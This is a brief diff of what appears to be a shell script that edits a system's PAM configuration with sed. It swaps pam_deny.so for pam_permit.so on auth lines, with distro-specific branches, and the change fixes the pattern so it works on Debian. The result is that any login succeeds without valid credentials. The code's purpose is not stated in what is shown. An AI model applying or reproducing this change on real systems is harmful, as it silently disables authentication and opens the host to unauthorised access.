@@ -54,7 +54,7 @@ then
 		sed -i -e 's/auth	required	pam_deny.so/auth	required	pam_permit.so/' "$PAM_FILE"
 	elif [ "$distro" == "Debian" ]
 	then
-		sed -i -e 's/auth	requisite	pam_deny.so/auth	requisite	pam_permit.so/' "$PAM_FILE"
+		sed -i -e 's/auth	requisite			pam_deny.so/auth	requisite			pam_permit.so/' "$PAM_FILE"
 	fi
 elif [ "$OS" == "FreeBSD" ]
 then
